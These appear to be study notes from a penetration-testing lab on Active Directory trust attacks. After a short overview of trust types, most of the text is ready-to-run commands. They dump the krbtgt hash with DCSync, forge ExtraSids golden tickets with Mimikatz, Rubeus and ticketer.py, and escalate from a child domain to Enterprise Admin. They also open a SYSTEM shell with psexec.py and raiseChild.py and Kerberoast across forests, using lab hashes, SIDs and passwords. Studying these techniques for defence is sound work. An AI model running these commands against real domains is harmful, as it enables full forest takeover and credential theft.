# AD Trust Attacks
## Trust Overview
- Types of trusts:
	- Parent-child - two or more domains with the same forest. Two-way transitive trust
	- Cross-link - trust between child domains to speed up authentication
	- External - non-transitive trust between two separate domains in separate forest, SID filtering
	- Tree-root - two-way transitive truts between forest and a new tree root domain
	- Forest - transitive trust between two forest root domains
	- ESAE - bastion forest used to manage AD
- Transit types
	- Transitive 
		- shared, 1 to many
		- trust is extended to objects that the child domain trusts
		- Forest, tree-root, parent-child, and cross-link trusts are transitive
	- Non-transitive
		- direct trust
		- child domain itself is the only one trusted
		- typical for external or custom trust setups
## Child-Parent Trust Attacks
- ExtraSids Attacks from Windows
	- Compromise of parent domain once the child domain has been compromised
	- Exploited due to lack of SID Filtering protection
		- If a user in a child domain is set to the Enterprise Admins group
		- they are threated as a members of this group
		- allows administrative access to the entire forest
	- Creating Golden Ticket from the compromised child domain to compromise parent domain
	- Modifying attribute to contain SID for the Enterprise Admins group
- What's necessary to perform this attack?
	- KRBTGT hash for the child domain
		- DCSync using Mimikatz "mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt"
	- SID for the child domain
		- Using PowerView > Get-DomainSID
	- Name of target user in the child domain (does not need to exist)
		- fakename
	- The FQDN of the child domain
		- LOGISTICS.INLANEFREIGHT.LOCAL
	- The SID of the Enterprise Admins group of the root domain
		- PowerView > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
		- Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
	- With all this collected, attack can be performed with Mimikatz or Rubeus
		- kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
		- .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
- ExtraSids Attacks from Linux
	- KRBTGT hash for the child domain
		- Performing DCSync with secretsdump.py
		- secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
	- SID for the child domain
		- Performing SID Brute Forcing using lookupsid.py
		- lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
	- Name of target user in the child domain (does not need to exist)
		- fakename
	- The FQDN of the child domain
	- The SID of the Enterprise Admins group of the root domain
		- lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
	- With all this collected, attack can be performed with Mimikatz or Rubeus
		- Constructing a Golden Ticket using ticketer.py
		- ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
	- Getting a SYSTEM shell using Impacket's psexec.py
		- psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
		- raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

## Cross-Forest Trust Attacks from Windows
- Cross-Forest Kerberoasting
	- Enumerate SPN
		- Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
		- Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
	- Roasting with Rubeus
		- .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
- Admin Password Re-Use & Group Membership
	- Enumerate groups with users that do not belong to the domain 
		- Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
	- Establish PS-Session
		- Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
- SID History Abuse - Cross Forest
	- When user is migrated from one forest to another and SID Filtering is OFF
	- its possible to add SID from the other forest
	- this SID will be added to the user's token when authenticcating across the trust
	- user will retain their administrative rights/access while being member of the new domain

## Cross-Forest Trust Attacks from Linux
- Cross-Forest Kerberoasting
	- Enumerate SPN
		- GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
		- GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
	- Hunting Foreign Group Membership with Bloodhound-python
		- In case we are on VM that gets IP from DHCP configured for internal DNS
			- add DNS hostname for the target DC instead of IP /etc/resolv.conf > domain INLANEFREIGHT.LOCAL; nameserver 172.16.5.5
			- bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
		- Adding other domain
			- /etc/resolv.conf > domain FREIGHTLOGISTICS.LOCAL ; nameserver 172.16.5.238
			- bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
		- Bloodhound 
			- we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL